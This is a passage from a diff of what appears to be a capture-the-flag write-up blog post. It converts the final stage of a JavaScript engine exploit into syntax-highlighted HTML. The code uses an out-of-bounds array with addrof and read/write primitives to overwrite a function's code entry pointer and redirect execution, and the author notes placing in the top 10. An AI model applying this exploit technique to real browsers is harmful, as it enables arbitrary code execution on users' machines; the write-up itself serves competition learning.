+  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = <span class="jsConVar">ftoi</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">itof</span>((<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>) + <span class="jsConVar">p</span> - <span class="jsConValIn">8n</span> + <span class="jsConValIn">1n</span>);
+  <span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">itof</span>(<span class="jsConVar">x</span>);
 }
-
-console.log("s3.5");
-
-let foo_addr = addrof(foo);
-console.log(foo_addr);
-console.log(oob[0]);
-
-
-
-foo_addr = addrof(foo);
-console.log("foo_addr:", foo_addr);
-
-let code = (read(foo_addr + 0x08n) - 1n) >> 32n;
-console.log("code:", code);
-
-console.log("0x00:", read(foo_addr + 0x00n));
-console.log("0x10:", read(foo_addr + 0x10n));
-
-let entry = read(code - 0x100n + 0x113n);
-console.log("entry:", entry);
-
-write(code - 0x100n + 0x113n, entry + 0x53n);
-entry = read(code - 0x100n + 0x113n);
-
-console.log("entry:", entry);
-
-console.log("launching");
-console.log(tmp);
-
-foo();
-```
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s3.5"</span>);
+<!---->
+<span class="jsConKw">let</span> <span class="jsConIdx">foo_addr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">foo</span>);
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">foo_addr</span>);
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">0</span>]);
+<!---->
+<!---->
+<!---->
+<span class="jsConVar">foo_addr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">foo</span>);
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"foo_addr:"</span>, <span class="jsConVar">foo_addr</span>);
+<!---->
+<span class="jsConKw">let</span> <span class="jsConIdx">code</span> = (<span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x08n</span>) - <span class="jsConValIn">1n</span>) &gt;&gt; <span class="jsConValIn">32n</span>;
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"code:"</span>, <span class="jsConVar">code</span>);
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"0x00:"</span>, <span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x00n</span>));
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"0x10:"</span>, <span class="jsConVar">read</span>(<span class="jsConVar">foo_addr</span> + <span class="jsConValIn">0x10n</span>));
+<!---->
+<span class="jsConKw">let</span> <span class="jsConIdx">entry</span> = <span class="jsConVar">read</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>);
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"entry:"</span>, <span class="jsConVar">entry</span>);
+<!---->
+<span class="jsConVar">write</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>, <span class="jsConVar">entry</span> + <span class="jsConValIn">0x53n</span>);
+<span class="jsConVar">entry</span> = <span class="jsConVar">read</span>(<span class="jsConVar">code</span> - <span class="jsConValIn">0x100n</span> + <span class="jsConValIn">0x113n</span>);
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"entry:"</span>, <span class="jsConVar">entry</span>);
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"launching"</span>);
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConVar">tmp</span>);
+<!---->
+<span class="jsConVar">foo</span>();</details></div>
+</div>
 
 Not as pretty as the one I made for the blog, but hey, I got the flag, and secured a place in the top 10 of the overall competition!
 
